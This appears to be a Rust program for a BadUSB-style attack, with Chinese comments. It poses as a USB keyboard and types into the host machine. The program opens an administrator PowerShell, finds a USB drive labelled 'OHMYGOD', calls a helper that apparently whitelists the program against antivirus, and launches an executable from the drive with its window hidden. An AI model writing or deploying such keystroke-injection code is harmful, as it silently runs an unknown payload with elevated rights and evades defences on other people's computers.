use std::{thread::sleep, time::Duration};
use hidg::{Class, Device, Keyboard};
use simple_logger::SimpleLogger;
use hid_simulator::{KeyboardHelper, KeySimulator, DRIVER_LETTER_VAR_NAME, EXE_FILE_PATH};

const DRIVER_NAME: &str = "OHMYGOD";

fn main() -> std::io::Result<()> {
    SimpleLogger::new().init().unwrap();

    let mut device = Device::<Keyboard>::open(0)?;
    let mut input = Keyboard.input();
    let mut key_helper = KeyboardHelper::new(&mut device, &mut input);
    let mut simulator = KeySimulator::new(&mut key_helper);

    //simulator.open_powershell()?;
    simulator.open_powershell_admin()?;
    sleep(Duration::from_millis(1000));  // 必须等待一段时间，当PowerShell完全弹出后，它才开始接收输入
    
    simulator.get_driver_letter(DRIVER_NAME)?;
    simulator.whitelist_the_program()?;
    
    // Start-Process：创建一个独立于当前控制台的程序，当前控制台退出不影响程序继续运行
    // -WindowStyle Hidden: 新程序的窗口被隐藏
    simulator.run_command_in_powershell(format!("Start-Process -FilePath ${{{DRIVER_LETTER_VAR_NAME}}}\\{EXE_FILE_PATH} -ArgumentList ${{{DRIVER_LETTER_VAR_NAME}}} -WindowStyle Hidden").as_str())?;
    simulator.run_command_in_powershell("exit")?;

    Ok(())
}